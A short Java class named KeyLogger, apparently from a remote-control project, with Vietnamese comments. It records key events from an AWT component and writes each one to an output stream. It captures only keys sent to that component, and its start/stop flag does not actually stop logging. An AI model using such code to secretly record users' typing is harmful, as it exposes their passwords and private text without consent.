package Controller;

import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.PrintWriter;
import java.util.HashMap;
import java.util.Map;

public class KeyLogger implements KeyListener {
    private PrintWriter out;
    private Map<Integer, String> specialKeys;
    private boolean isRunning;

    public KeyLogger(PrintWriter out) {
        this.out = out;
        initializeSpecialKeys();
        isRunning = false;
    }

    private void initializeSpecialKeys() {
        specialKeys = new HashMap<>();
        specialKeys.put(KeyEvent.VK_SPACE, " ");
        specialKeys.put(KeyEvent.VK_ENTER, "\n");
        specialKeys.put(KeyEvent.VK_TAB, "\t");
        // Add more special keys as needed
    }

    @Override
    public void keyTyped(KeyEvent e) {
        logKeyEvent("Key Typed", e);
    }

    @Override
    public void keyPressed(KeyEvent e) {
        logKeyEvent("Key Pressed", e);
    }

    @Override
    public void keyReleased(KeyEvent e) {
        logKeyEvent("Key Released", e);
    }

    private void logKeyEvent(String eventType, KeyEvent e) {
        String keyText = KeyEvent.getKeyText(e.getKeyCode());
        if (specialKeys.containsKey(e.getKeyCode())) {
            keyText = specialKeys.get(e.getKeyCode());
        }
        sendKeyEvent(eventType + ": " + keyText);
    }

    private void sendKeyEvent(String event) {
        out.println("KEY:" + event);
        out.flush();
    }

    public void startKeylogger() {
        if (!isRunning) {
            isRunning = true;
            // Bắt đầu lắng nghe sự kiện từ bàn phím
            System.out.println("Keylogger started...");
        }
    }

    public void stopKeylogger() {
        isRunning = false;
        // Dừng lắng nghe sự kiện từ bàn phím
        System.out.println("Keylogger stopped.");
    }

    public boolean isRunning() {
        return isRunning;
    }
}
